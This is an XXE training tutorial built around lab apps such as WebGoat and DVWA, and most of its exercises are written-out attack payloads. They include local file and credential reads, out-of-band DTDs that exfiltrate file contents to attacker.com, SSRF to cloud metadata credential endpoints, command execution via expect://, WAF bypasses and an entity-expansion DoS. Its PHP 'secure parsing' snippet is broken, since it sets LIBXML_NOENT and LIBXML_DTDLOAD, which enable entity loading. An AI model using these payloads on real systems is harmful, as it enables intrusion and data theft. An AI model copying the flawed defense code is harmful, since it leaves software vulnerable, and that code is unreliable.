# 🔤 XML External Entity (XXE) Tutorial

**Difficulty**: ⭐⭐⭐⭐ (Intermediate)  
**Time Required**: 2-3 hours  
**Applications**: WebGoat, XXE Lab, DVWA

## 📚 Table of Contents
1. [What is XXE?](#what-is-xxe)
2. [Understanding XML Basics](#understanding-xml-basics)
3. [How XXE Works](#how-xxe-works)
4. [Types of XXE Attacks](#types-of-xxe-attacks)
5. [Hands-On Practice](#hands-on-practice)
6. [Defense Strategies](#defense-strategies)
7. [Additional Resources](#additional-resources)

---

## 🎯 Learning Objectives

By the end of this tutorial, you will:
- ✅ Understand XML structure and entities
- ✅ Identify XXE injection points
- ✅ Perform file disclosure attacks
- ✅ Execute SSRF through XXE
- ✅ Implement secure XML parsing

---

## What is XXE?

XML External Entity (XXE) injection is a web security vulnerability that allows attackers to interfere with an application's processing of XML data. It can lead to file disclosure, server-side request forgery (SSRF), port scanning, and denial of service.

### 🎬 Real-World Impact

Notable XXE vulnerabilities:
- **Facebook (2013)**: XXE in Word document parsing - $33,500 bounty
- **Uber (2016)**: XXE leading to internal file access
- **Google (2014)**: XXE in Google Docs
- **PayPal (2013)**: XXE allowing system file access

### 🔍 Where XXE Occurs

Common places to find XXE:
- 📄 XML file uploads
- 📨 SOAP web services
- 📱 Mobile app APIs
- 🗂️ Document parsers (DOCX, XLSX, SVG)
- 🔧 Configuration files

---

## Understanding XML Basics

### XML Structure
```xml
<?xml version="1.0" encoding="UTF-8"?>
<note>
    <to>User</to>
    <from>Admin</from>
    <message>Hello World</message>
</note>
```

### Document Type Definition (DTD)
```xml
<!DOCTYPE note [
    <!ELEMENT note (to,from,message)>
    <!ELEMENT to (#PCDATA)>
    <!ELEMENT from (#PCDATA)>
    <!ELEMENT message (#PCDATA)>
]>
```

### XML Entities

**Internal Entity:**
```xml
<!DOCTYPE note [
    <!ENTITY writer "Donald Duck">
]>
<note>
    <from>&writer;</from>
</note>
```

**External Entity (The Danger!):**
```xml
<!DOCTYPE note [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<note>
    <message>&xxe;</message>
</note>
```

---

## How XXE Works

### Vulnerable Code Example

```php
// BAD: External entities enabled
$xml = simplexml_load_string($_POST['xml']);

// Or with DOMDocument
$doc = new DOMDocument();
$doc->loadXML($_POST['xml']); // Dangerous!
```

### Attack Flow

1. **Attacker** sends XML with external entity definition
2. **Parser** processes the DTD and entity
3. **Server** fetches the external resource
4. **Application** returns the content in response

### XXE Protocols

XXE can use various protocols:
- `file://` - Read local files
- `http://` - Make HTTP requests (SSRF)
- `ftp://` - FTP requests
- `php://` - PHP wrappers (filter, input, etc.)
- `expect://` - Execute commands (if installed)

---

## Types of XXE Attacks

### 1. Classic XXE (File Disclosure)
Read sensitive files from the server

### 2. Blind XXE
No direct output, but out-of-band techniques work

### 3. Error-Based XXE
Extract data through error messages

### 4. XXE for SSRF
Make the server perform requests

### 5. Billion Laughs Attack
DoS through recursive entity expansion

---

## Hands-On Practice

### 🏃 Exercise 1: Basic File Disclosure (XXE Lab)

**Setup**: Start XXE Lab application  
**Goal**: Read the `/etc/passwd` file

<details>
<summary>💡 Hint 1: Find the XML input</summary>

Look for places where the application accepts XML:
- File upload forms
- API endpoints accepting XML
- SOAP services

Try changing Content-Type to `application/xml` on regular forms!

</details>

<details>
<summary>💡 Hint 2: Basic XXE payload structure</summary>

You need:
1. XML declaration
2. DOCTYPE with entity definition
3. Reference to the entity

Start with:
```xml
<?xml version="1.0"?>
<!DOCTYPE root [

]>
<root></root>
```

</details>

<details>
<summary>💡 Hint 3: Entity syntax</summary>

To define an external entity:
```xml
<!ENTITY name SYSTEM "protocol://path">
```

Then reference it with `&name;`

</details>

<details>
<summary>🔓 Solution</summary>

**Payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
    <productId>&xxe;</productId>
</stockCheck>
```

**Alternative for Windows:**
```xml
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
```

**Reading source code:**
```xml
<!ENTITY xxe SYSTEM "file:///var/www/html/index.php">
```

**Using PHP filter wrapper for base64:**
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

</details>

---

### 🏃 Exercise 2: Blind XXE with Out-of-Band (WebGoat)

**Setup**: Navigate to WebGoat XXE lesson  
**Goal**: Extract data when no direct output is shown

<details>
<summary>💡 Hint 1: Understanding blind XXE</summary>

In blind XXE, the application doesn't return the entity content. You need to:
1. Make the server connect to your server
2. Include the data in the request

You'll need an external server to receive data!

</details>

<details>
<summary>💡 Hint 2: Parameter entities</summary>

Regular entities might not work in DTDs. Use parameter entities:
```xml
<!ENTITY % name "value">
```

Reference with `%name;` instead of `&name;`

</details>

<details>
<summary>💡 Hint 3: DTD chaining</summary>

You can load external DTDs:
```xml
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
    %xxe;
]>
```

This loads and executes your remote DTD!

</details>

<details>
<summary>🔓 Solution</summary>

**Step 1: Create external DTD** (evil.dtd on your server):
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

**Step 2: XXE payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
    %xxe;
]>
<foo></foo>
```

**Alternative using PHP base64:**
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

**For error-based extraction:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

</details>

---

### 🏃 Exercise 3: XXE to SSRF (DVWA)

**Setup**: Find an XML upload or parser  
**Goal**: Make internal HTTP requests

<details>
<summary>💡 Hint 1: HTTP protocol in XXE</summary>

XXE supports HTTP:
```xml
<!ENTITY xxe SYSTEM "http://internal-site.com">
```

This makes the server fetch that URL!

</details>

<details>
<summary>💡 Hint 2: Internal services</summary>

Common internal services to target:
- `http://localhost:8080` - Internal apps
- `http://169.254.169.254` - AWS metadata
- `http://192.168.1.1` - Internal network
- `http://127.0.0.1:22` - Check if SSH is open

</details>

<details>
<summary>💡 Hint 3: Port scanning</summary>

You can check if ports are open by timing:
- Fast response = open port
- Slow/timeout = closed port

Or check error messages!

</details>

<details>
<summary>🔓 Solution</summary>

**SSRF to internal service:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://localhost:8080/admin">
]>
<root>
    <data>&xxe;</data>
</root>
```

**AWS metadata extraction:**
```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

**Port scanning payload:**
```xml
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://internal.host:8080">
]>
<root>&xxe;</root>
```

**Chaining with other protocols:**
```xml
<!-- Try FTP for username disclosure -->
<!ENTITY xxe SYSTEM "ftp://internal.host">

<!-- Gopher for SMTP -->
<!ENTITY xxe SYSTEM "gopher://internal.host:25">
```

</details>

---

### 🏃 Exercise 4: XXE in File Formats

**Goal**: Exploit XXE in DOCX/XLSX/SVG files

<details>
<summary>💡 Hint 1: File format structure</summary>

Many file formats are just ZIP archives containing XML:
- DOCX, XLSX, PPTX (Microsoft Office)
- ODT, ODS (OpenDocument)
- SVG is pure XML

Unzip them to see the structure!

</details>

<details>
<summary>💡 Hint 2: Injection points</summary>

In DOCX, check:
- `word/document.xml`
- `word/_rels/document.xml.rels`
- `[Content_Types].xml`

Add your DTD to these files!

</details>

<details>
<summary>💡 Hint 3: SVG XXE</summary>

SVG supports XML entities:
```xml
<!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
    <text>&xxe;</text>
</svg>
```

</details>

<details>
<summary>🔓 Solution</summary>

**DOCX XXE:**
1. Create a normal DOCX
2. Unzip it: `unzip document.docx`
3. Edit `word/document.xml`:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document>
    <w:body>
        <w:p>
            <w:r>
                <w:t>&xxe;</w:t>
            </w:r>
        </w:p>
    </w:body>
</w:document>
```
4. Zip it back: `zip -r evil.docx *`

**SVG XXE:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">&xxe;</text>
</svg>
```

**Excel XXE (in sharedStrings.xml):**
```xml
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<sst>
    <si><t>&xxe;</t></si>
</sst>
```

</details>

---

### 🏃 Challenge: Advanced XXE Techniques

**Goal**: Combine multiple XXE techniques

<details>
<summary>🎯 Challenge Tasks</summary>

1. Extract a binary file via XXE
2. Bypass WAF filtering "SYSTEM"
3. Execute commands through XXE
4. Create a billion laughs DoS

</details>

<details>
<summary>💡 Hint: Advanced techniques</summary>

Think about:
- UTF-16 encoding for bypass
- HTML entities in entity names
- Recursive entities
- Alternative protocols

</details>

<details>
<summary>🔓 Solution</summary>

**Binary file extraction:**
```xml
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/shadow">
    <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
    %dtd;
]>
<foo>&send;</foo>
```

**WAF bypass with encoding:**
```xml
<!-- UTF-16BE -->
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<!-- Using HTML entities -->
<!DOCTYPE foo [
    <!ENTITY xxe &#x53;&#x59;&#x53;&#x54;&#x45;&#x4D; "file:///etc/passwd">
]>
```

**Command execution (if expect:// is enabled):**
```xml
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>
```

**Billion laughs DoS:**
```xml
<!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<lolz>&lol5;</lolz>
```

</details>

---

## Defense Strategies

### 🛡️ Secure XML Parsing

**PHP:**
```php
// Disable external entities
libxml_disable_entity_loader(true);

// For DOMDocument
$doc = new DOMDocument();
$doc->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);

// For SimpleXML
$xml = simplexml_load_string($data, 'SimpleXMLElement', LIBXML_NOENT);
```

**Java:**
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

**Python:**
```python
from lxml import etree

# Safe parser
parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.parse(file, parser)
```

**.NET:**
```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
XmlReader reader = XmlReader.Create(stream, settings);
```

### 🛡️ Additional Protections

1. **Input Validation**
   - Reject DTDs entirely if not needed
   - Whitelist allowed XML structures

2. **Use JSON Instead**
   - When possible, prefer JSON over XML

3. **Security Headers**
   - Set Content-Type properly
   - Use Content-Security-Policy

4. **Regular Updates**
   - Keep XML libraries patched
   - Monitor for XXE vulnerabilities

---

## 📊 XXE Cheat Sheet

### Detection Payloads
```xml
<!-- Basic test -->
<!DOCTYPE foo [<!ENTITY xxe "test">]><foo>&xxe;</foo>

<!-- With SYSTEM -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>

<!-- Parameter entity -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com">%xxe;]>
```

### Useful Files to Read
| OS | File Path | Description |
|----|-----------|-------------|
| Linux | `/etc/passwd` | User accounts |
| Linux | `/etc/hosts` | Network config |
| Linux | `/proc/self/environ` | Environment vars |
| Linux | `~/.ssh/id_rsa` | SSH private key |
| Windows | `C:\Windows\win.ini` | Windows config |
| Windows | `C:\Windows\System32\drivers\etc\hosts` | Hosts file |
| Any | `config.php`, `web.config` | App configs |

---

## 🏆 Skill Check

Before moving on, make sure you can:

- [ ] Identify XXE injection points
- [ ] Extract files using XXE
- [ ] Perform blind XXE attacks
- [ ] Use XXE for SSRF
- [ ] Implement secure XML parsing

---

## Additional Resources

### 🔧 Tools
- **XXEinjector**: Automated XXE exploitation tool
- **OXML_XXE**: XXE in Office documents
- **XXE-FTP-Server**: For blind XXE

### 📖 Further Reading
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PortSwigger XXE Tutorial](https://portswigger.net/web-security/xxe)
- [PayloadsAllTheThings XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

### 🎥 Video Resources
- [LiveOverflow - XXE Explained](https://www.youtube.com/watch?v=gjm6VHZa_8s)
- [STÖK - XXE Tutorial](https://www.youtube.com/watch?v=LZUlw8hHp44)

---

**Next Tutorial**: [Server-Side Request Forgery (SSRF)](ssrf.md) → 